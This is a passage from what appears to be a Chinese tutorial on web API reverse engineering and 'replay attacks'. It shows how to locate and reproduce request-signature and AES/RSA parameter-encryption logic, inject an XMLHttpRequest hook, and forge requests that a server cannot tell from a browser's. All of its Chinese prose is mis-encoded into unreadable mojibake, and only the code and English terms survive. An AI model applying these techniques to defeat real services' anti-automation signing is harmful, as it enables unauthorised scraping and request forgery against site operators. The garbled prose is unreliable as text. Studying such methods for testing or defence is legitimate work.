      <p>è®°ä½è¿™äº›â€œäº¤é€šè¦é“â€ï¼Œ90% çš„åŠ å¯†å‚æ•°éƒ½ä¼šç»è¿‡è¿™é‡Œï¼š</p>

      <ol>
        <li><strong>JSON.stringify</strong>: æ— è®ºä»€ä¹ˆåŠ å¯†å‚æ•°ï¼Œæœ€åå¾€å¾€éƒ½è¦è½¬æˆ JSON å‘ç»™æœåŠ¡å™¨ã€‚</li>
        <li><strong>JSON.parse</strong>: æœåŠ¡å™¨è¿”å›çš„åŠ å¯†æ•°æ®ï¼Œè§£å¯†åå¾€å¾€è¦è½¬æˆ JSON å¯¹è±¡ã€‚</li>
        <li><strong>String.prototype.split / slice</strong>: å­—ç¬¦ä¸²æ“ä½œå‡½æ•°ã€‚</li>
        <li><strong>XMLHttpRequest.prototype.open / send</strong>: ç½‘ç»œè¯·æ±‚å…¥å£ã€‚</li>
        <li><strong>Headers.prototype.append</strong>: Fetch API æ·»åŠ  Header æ—¶ã€‚</li>
      </ol>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>Hook çš„æœ¬è´¨æ˜¯ <strong>AOP (é¢å‘åˆ‡é¢ç¼–ç¨‹)</strong>ã€‚åœ¨é€†å‘ä¸­ï¼Œå®ƒæ˜¯æˆ‘ä»¬åˆ‡å…¥é»‘ç›’ç³»ç»Ÿçš„ä¸»è¦æ‰‹æ®µã€‚æ—¶åˆ»è®°å¾—ï¼šHook ä»£ç è¦å°½å¯èƒ½æ—©åœ°æ³¨å…¥ï¼ˆæ³¨å…¥æ—¶æœºåœ¨åŠ è½½ DevTools
        ä¹‹å‰æœ€ä½³ï¼Œå¦‚ä½¿ç”¨æ²¹çŒ´è„šæœ¬æˆ– Local Overridesï¼‰ã€‚</p>

    </div>

    <div class="section" id="03-Basic-Recipes-api-reverse-engineering">
      <h2>28. API Reverse Engineering</h2>
      <h1 id="api-é€†å‘ä¸é‡æ”¾æ”»å‡»">API é€†å‘ä¸é‡æ”¾æ”»å‡»</h1>

      <p>æŒæ¡ API ç­¾åé€†å‘ï¼Œå®ç°è„±ç¦»æµè§ˆå™¨çš„è‡ªåŠ¨åŒ–è¯·æ±‚ã€‚</p>

      <hr />

      <h2 id="é…æ–¹ä¿¡æ¯">ğŸ“Š é…æ–¹ä¿¡æ¯</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>éš¾åº¦</strong></td>
            <td>â­â­â­ (ä¸­çº§)</td>
          </tr>
          <tr>
            <td><strong>é¢„è®¡æ—¶é—´</strong></td>
            <td>1-4 å°æ—¶</td>
          </tr>
          <tr>
            <td><strong>æ‰€éœ€å·¥å…·</strong></td>
            <td>Chrome DevTools, Python/Node.js</td>
          </tr>
          <tr>
            <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
            <td>API ç­¾åç ´è§£ã€å‚æ•°åŠ å¯†åˆ†æã€è¯·æ±‚ä¼ªé€ </td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="å­¦ä¹ ç›®æ ‡">ğŸ¯ å­¦ä¹ ç›®æ ‡</h2>

      <p>å®Œæˆæœ¬é…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>

      <ul>
        <li>âœ… å¿«é€Ÿå®šä½ API ç­¾åç®—æ³•</li>
        <li>âœ… åˆ†æå¸¸è§çš„ç­¾åç»“æ„ (MD5/SHA/HMAC)</li>
        <li>âœ… å¤„ç†æ—¶é—´æˆ³ã€Nonce ç­‰åŠ¨æ€å‚æ•°</li>
        <li>âœ… å®ç°å®Œæ•´çš„ API é‡æ”¾æ”»å‡»</li>
        <li>âœ… ç¼–å†™è‡ªåŠ¨åŒ–è„šæœ¬è°ƒç”¨ API</li>
      </ul>

      <hr />

      <h2 id="æ ¸å¿ƒæ¦‚å¿µ">ğŸ’¡ æ ¸å¿ƒæ¦‚å¿µ</h2>

      <p>é€†å‘çš„æœ€ç»ˆç›®çš„é€šå¸¸ä¸æ˜¯ä¸ºäº†çœ‹ä»£ç ï¼Œè€Œæ˜¯ä¸ºäº†<strong>è°ƒç”¨ API</strong>ã€‚æˆ‘ä»¬éœ€è¦ææ¸…æ¥šå®¢æˆ·ç«¯æ˜¯å¦‚ä½•æ„é€ è¯·æ±‚çš„ï¼Œä»¥ä¾¿æˆ‘ä»¬åœ¨è„šæœ¬ä¸­è„±ç¦»æµè§ˆå™¨ä¼ªé€ è¯·æ±‚ã€‚</p>

      <p>API é€†å‘çš„æ ¸å¿ƒæ˜¯<strong>ä»¥å‡ä¹±çœŸ</strong> â€”â€” è®©æœåŠ¡å™¨æ— æ³•åŒºåˆ†è¯·æ±‚æ¥è‡ªæµè§ˆå™¨è¿˜æ˜¯è‡ªåŠ¨åŒ–è„šæœ¬ã€‚</p>

      <hr />

      <h2 id="1-ç­¾åå‚æ•°åˆ†æ-signature-analysis">1. ç­¾åå‚æ•°åˆ†æ (Signature Analysis)</h2>

      <p>å¤§å¤šæ•°ç°ä»£ API éƒ½æœ‰ç­¾åæœºåˆ¶ï¼Œé˜²æ­¢å‚æ•°è¢«ç¯¡æ”¹ã€‚</p>

      <h3 id="11-å¸¸è§ç­¾åç»“æ„">1.1 å¸¸è§ç­¾åç»“æ„</h3>

      <h4 id="åŸºç¡€å“ˆå¸Œç­¾å">åŸºç¡€å“ˆå¸Œç­¾å</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># MD5 ç­¾å</span>
<span class="n">sign</span> <span class="o">=</span> <span class="n">MD5</span><span class="p">(</span><span class="n">param1</span><span class="o">=</span><span class="n">a</span><span class="o">&amp;</span><span class="n">param2</span><span class="o">=</span><span class="n">b</span><span class="o">&amp;</span><span class="n">timestamp</span><span class="o">=</span><span class="mi">123456</span><span class="o">&amp;</span><span class="n">salt</span><span class="o">=</span><span class="n">xxxx</span><span class="p">)</span>

<span class="c1"># SHA256 ç­¾å</span>
<span class="n">sign</span> <span class="o">=</span> <span class="n">SHA256</span><span class="p">(</span><span class="n">user_id</span> <span class="o">+</span> <span class="n">timestamp</span> <span class="o">+</span> <span class="n">secret_key</span><span class="p">)</span>

<span class="c1"># å¤šå±‚ç­¾å</span>
<span class="n">sign</span> <span class="o">=</span> <span class="n">MD5</span><span class="p">(</span><span class="n">SHA256</span><span class="p">(</span><span class="n">params</span><span class="p">)</span> <span class="o">+</span> <span class="n">salt</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="hmac-ç­¾å">HMAC ç­¾å</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># HMAC-SHA256ï¼ˆæ›´å®‰å…¨ï¼Œé˜²å½©è™¹è¡¨ï¼‰</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hmac</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_hmac_sign</span><span class="p">(</span><span class="n">params</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">):</span>
    <span class="n">message</span> <span class="o">=</span> <span class="s2">&quot;&amp;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">items</span><span class="p">())])</span>
    <span class="k">return</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span>
        <span class="n">secret_key</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span>
        <span class="n">message</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span>
        <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span>
    <span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</code></pre>
      </div>

      <h4 id="è‡ªå®šä¹‰ç­¾åç®—æ³•">è‡ªå®šä¹‰ç­¾åç®—æ³•</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æŸç”µå•†å¹³å°çš„é­”æ”¹ç­¾å</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">customSign</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">).</span><span class="nx">sort</span><span class="p">().</span><span class="nx">map</span><span class="p">(</span><span class="nx">k</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">params</span><span class="p">[</span><span class="nx">k</span><span class="p">]).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="c1">// é­”æ”¹çš„ MD5ï¼šå¢åŠ äº†ä½ç§»å’Œå¼‚æˆ–æ“ä½œ</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">hash</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">reverse</span><span class="p">().</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">substring</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">16</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="12-ç­¾åè¿˜åŸæ­¥éª¤">1.2 ç­¾åè¿˜åŸæ­¥éª¤</h3>

      <h4 id="ç¬¬ä¸€æ­¥è§‚å¯Ÿå˜é‡è§„å¾‹">ç¬¬ä¸€æ­¥ï¼šè§‚å¯Ÿå˜é‡è§„å¾‹</h4>

      <p>åœ¨ Network é¢æ¿å‘é€ 5-10 ä¸ªè¯·æ±‚ï¼Œè®°å½•æ‰€æœ‰å‚æ•°çš„å˜åŒ–ï¼š</p>

      <table>
        <thead>
          <tr>
            <th>è¯·æ±‚åºå·</th>
            <th>timestamp</th>
            <th>nonce</th>
            <th>user_id</th>
            <th>sign</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>1</td>
            <td>1638360000</td>
            <td>abc123</td>
            <td>1001</td>
            <td>5f8e9d2a&#8230;</td>
          </tr>
          <tr>
            <td>2</td>
            <td>1638360003</td>
            <td>def456</td>
            <td>1001</td>
            <td>7a3b1c4e&#8230;</td>
          </tr>
          <tr>
            <td>3</td>
            <td>1638360005</td>
            <td>ghi789</td>
            <td>1001</td>
            <td>2d6f8e1b&#8230;</td>
          </tr>
        </tbody>
      </table>

      <p><strong>åˆ†æè§„å¾‹</strong>:</p>

      <ul>
        <li><code>timestamp</code>: æ¯æ¬¡é€’å¢ï¼ŒUnix æ—¶é—´æˆ³</li>
        <li><code>nonce</code>: éšæœºå­—ç¬¦ä¸²ï¼ˆ6ä½ï¼‰</li>
        <li><code>user_id</code>: å›ºå®šå€¼</li>
        <li><code>sign</code>: æ¯æ¬¡éƒ½ä¸åŒ â†’ ä¾èµ–äºå…¶ä»–å‚æ•°</li>
      </ul>

      <h4 id="ç¬¬äºŒæ­¥å®šä½ç­¾åé€»è¾‘">ç¬¬äºŒæ­¥ï¼šå®šä½ç­¾åé€»è¾‘</h4>

      <p><strong>æ–¹æ³• 1: å…³é”®å­—æœç´¢</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ Sources é¢æ¿æœç´¢ä»¥ä¸‹å…³é”®å­—</span>
<span class="nx">sign</span>
<span class="nx">signature</span>
<span class="nx">_sign</span>
<span class="nx">generateSign</span>
<span class="nx">md5</span>
<span class="nx">sha</span>
<span class="nx">encrypt</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 2: XHR Breakpoint</strong><br />
        åœ¨ DevTools ä¸­è®¾ç½® URL æ–­ç‚¹ï¼š</p>

      <ul>
        <li>Network â†’ å³é”®è¯·æ±‚ â†’ &#8220;Replay XHR&#8221;</li>
        <li>Sources â†’ XHR/fetch Breakpoints â†’ æ·»åŠ  URL å…³é”®å­—ï¼ˆå¦‚ <code>/api/</code>ï¼‰</li>
        <li>åˆ·æ–°é¡µé¢ï¼Œè‡ªåŠ¨æ–­åœ¨å‘åŒ…å‰</li>
      </ul>

      <p><strong>æ–¹æ³• 3: Hook XMLHttpRequest/fetch</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ³¨å…¥åˆ°é¡µé¢æœ€å‰é¢ï¼ˆConsole æˆ– Tampermonkeyï¼‰</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">_open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">open</span><span class="p">;</span>
<span class="w">    </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[XHR]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">method</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;/api/data&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">debugger</span><span class="p">;</span><span class="w"> </span><span class="c1">// å‘é€ /api/data è¯·æ±‚å‰è‡ªåŠ¨æ–­ç‚¹</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">_open</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h4 id="ç¬¬ä¸‰æ­¥ç®—æ³•è¯†åˆ«">ç¬¬ä¸‰æ­¥ï¼šç®—æ³•è¯†åˆ«</h4>

      <p><strong>æ ‡å‡†ç®—æ³•è¯†åˆ«</strong></p>

      <table>
        <thead>
          <tr>
            <th>ç‰¹å¾</th>
            <th>ç®—æ³•</th>
            <th>è¾“å‡ºé•¿åº¦</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>å­—ç¬¦é›† <code>[0-9a-f]</code></td>
            <td>MD5</td>
            <td>32 å­—ç¬¦</td>
          </tr>
          <tr>
            <td>å­—ç¬¦é›† <code>[0-9a-f]</code></td>
            <td>SHA1</td>
            <td>40 å­—ç¬¦</td>
          </tr>
          <tr>
            <td>å­—ç¬¦é›† <code>[0-9a-f]</code></td>
            <td>SHA256</td>
            <td>64 å­—ç¬¦</td>
          </tr>
          <tr>
            <td>å­—ç¬¦é›† <code>[A-Za-z0-9+/=]</code></td>
            <td>Base64 ç¼–ç </td>
            <td>ä»»æ„é•¿åº¦ï¼Œèƒ½è¢«4æ•´é™¤</td>
          </tr>
          <tr>
            <td>å­—ç¬¦é›† <code>[A-Za-z0-9]</code></td>
            <td>è‡ªå®šä¹‰ç¼–ç </td>
            <td>éœ€è¦åˆ†æå…·ä½“é€»è¾‘</td>
          </tr>
        </tbody>
      </table>

      <p><strong>åœ¨ä»£ç ä¸­æŸ¥æ‰¾ç‰¹å¾ç </strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// MD5 ç‰¹å¾ï¼šåˆå§‹åŒ–å‘é‡</span>
<span class="mh">0x67452301</span><span class="p">,</span><span class="w"> </span><span class="mh">0xefcdab89</span><span class="p">,</span><span class="w"> </span><span class="mh">0x98badcfe</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10325476</span>

<span class="c1">// AES ç‰¹å¾ï¼šS-Box è¡¨</span>
<span class="mh">0x63</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x77</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7b</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6f</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc5</span><span class="p">...</span>

<span class="c1">// RSA ç‰¹å¾ï¼šå¤§ç´ æ•°è¿ç®—</span>
<span class="nx">modPow</span><span class="p">,</span><span class="w"> </span><span class="nx">BigInteger</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10001</span><span class="w"> </span><span class="p">(</span><span class="nx">å¸¸è§å…¬é’¥æŒ‡æ•°</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="ç¬¬å››æ­¥å¤ç°ç­¾åç®—æ³•">ç¬¬å››æ­¥ï¼šå¤ç°ç­¾åç®—æ³•</h4>

      <p><strong>æ¡ˆä¾‹ï¼šæŸè§†é¢‘ç½‘ç«™ç­¾å</strong></p>

      <p>é€†å‘å‘ç°ç­¾åé€»è¾‘ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æµè§ˆå™¨ä¸­çš„ç­¾åå‡½æ•°</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">getSign</span><span class="p">(</span><span class="nx">videoId</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">salt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;h5@video#2024&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">raw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`videoId=</span><span class="si">${</span><span class="nx">videoId</span><span class="si">}</span><span class="sb">&amp;ts=</span><span class="si">${</span><span class="nx">timestamp</span><span class="si">}</span><span class="sb">&amp;salt=</span><span class="si">${</span><span class="nx">salt</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="nx">raw</span><span class="p">).</span><span class="nx">toUpperCase</span><span class="p">();</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p>Python å¤ç°ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">def</span><span class="w"> </span><span class="nf">get_sign</span><span class="p">(</span><span class="n">video_id</span><span class="p">,</span> <span class="n">timestamp</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">timestamp</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
        <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>

    <span class="n">salt</span> <span class="o">=</span> <span class="s2">&quot;h5@video#2024&quot;</span>
    <span class="n">raw</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;videoId=</span><span class="si">{</span><span class="n">video_id</span><span class="si">}</span><span class="s2">&amp;ts=</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">&amp;salt=</span><span class="si">{</span><span class="n">salt</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">raw</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>

<span class="c1"># æµ‹è¯•</span>
<span class="n">sign</span> <span class="o">=</span> <span class="n">get_sign</span><span class="p">(</span><span class="s2">&quot;BV1xv4y1X7Yp&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">sign</span><span class="p">)</span>  <span class="c1"># è¾“å‡ºï¼šE8A7F2D3C1B9...</span>
</code></pre>
      </div>

      <hr />

      <h2 id="2-åŠ å¯†å‚æ•°åˆ†æ">2. åŠ å¯†å‚æ•°åˆ†æ</h2>

      <p>é™¤äº†ç­¾åï¼Œå¾ˆå¤š API ä¼šå¯¹<strong>æ•´ä¸ªè¯·æ±‚ä½“</strong>æˆ–<strong>æ•æ„Ÿå‚æ•°</strong>åŠ å¯†ã€‚</p>

      <h3 id="21-aes-åŠ å¯†">2.1 AES åŠ å¯†</h3>

      <p><strong>ç‰¹å¾è¯†åˆ«</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä»£ç ä¸­å¯èƒ½å‡ºç°çš„å…³é”®å­—</span>
<span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span>
<span class="nx">crypto</span><span class="p">.</span><span class="nx">createCipheriv</span><span class="p">(</span><span class="s1">&#39;aes-128-cbc&#39;</span><span class="p">)</span>
<span class="nx">Cipher</span><span class="p">.</span><span class="nx">getInstance</span><span class="p">(</span><span class="s2">&quot;AES/CBC/PKCS5Padding&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>æ¡ˆä¾‹ï¼šæŸç™»å½•æ¥å£</strong></p>

      <p>æµè§ˆå™¨ä»£ç ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">encryptPassword</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="s2">&quot;1234567890abcdef&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">iv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="s2">&quot;abcdef1234567890&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">iv</span><span class="o">:</span><span class="w"> </span><span class="nx">iv</span><span class="p">,</span>
<span class="w">        </span><span class="nx">mode</span><span class="o">:</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">mode</span><span class="p">.</span><span class="nx">CBC</span><span class="p">,</span>
<span class="w">        </span><span class="nx">padding</span><span class="o">:</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">pad</span><span class="p">.</span><span class="nx">Pkcs7</span>
<span class="w">    </span><span class="p">});</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">encrypted</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span><span class="w"> </span><span class="c1">// Base64 æ ¼å¼</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p>Python å¤ç°ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.Padding</span><span class="w"> </span><span class="kn">import</span> <span class="n">pad</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

<span class="k">def</span><span class="w"> </span><span class="nf">encrypt_password</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;1234567890abcdef&#39;</span>
    <span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;abcdef1234567890&#39;</span>

    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

<span class="c1"># æµ‹è¯•</span>
<span class="nb">print</span><span class="p">(</span><span class="n">encrypt_password</span><span class="p">(</span><span class="s2">&quot;MyPassword123&quot;</span><span class="p">))</span>
</code></pre>
      </div>

      <h3 id="22-rsa-åŠ å¯†">2.2 RSA åŠ å¯†</h3>

      <p>é€šå¸¸ç”¨äºåŠ å¯† AES çš„å¯†é’¥ï¼ˆæ··åˆåŠ å¯†ï¼‰æˆ–ç™»å½•å¯†ç ã€‚</p>

      <p><strong>æå–å…¬é’¥</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æµè§ˆå™¨ä¸­æŸ¥æ‰¾</span>
<span class="nx">publicKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGS...&quot;</span>

<span class="c1">// æˆ–ä»æ¥å£è¿”å›</span>
<span class="nx">GET</span><span class="w"> </span><span class="o">/</span><span class="nx">api</span><span class="o">/</span><span class="nx">getPublicKey</span>
<span class="p">{</span>
<span class="w">  </span><span class="s2">&quot;key&quot;</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;MIGfMA0GCSqGS...&quot;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>Python å¤ç°</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.PublicKey</span><span class="w"> </span><span class="kn">import</span> <span class="n">RSA</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">PKCS1_v1_5</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

<span class="k">def</span><span class="w"> </span><span class="nf">rsa_encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">public_key_str</span><span class="p">):</span>
    <span class="n">public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">public_key_str</span><span class="p">)</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_v1_5</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

<span class="n">public_key</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span>
<span class="s2">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC...</span>
<span class="s2">-----END PUBLIC KEY-----&quot;&quot;&quot;</span>

<span class="n">password_encrypted</span> <span class="o">=</span> <span class="n">rsa_encrypt</span><span class="p">(</span><span class="s2">&quot;MyPassword123&quot;</span><span class="p">,</span> <span class="n">public_key</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="23-è‡ªå®šä¹‰åŠ å¯†ç®—æ³•">2.3 è‡ªå®šä¹‰åŠ å¯†ç®—æ³•</h3>

      <p><strong>æ¡ˆä¾‹ï¼šæŸ App çš„é­”æ”¹ Base64</strong></p>

      <p>é€†å‘å‘ç°å®ƒæŠŠæ ‡å‡† Base64 å­—ç¬¦è¡¨æ‰“ä¹±äº†ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ ‡å‡† Base64 å­—ç¬¦è¡¨</span>
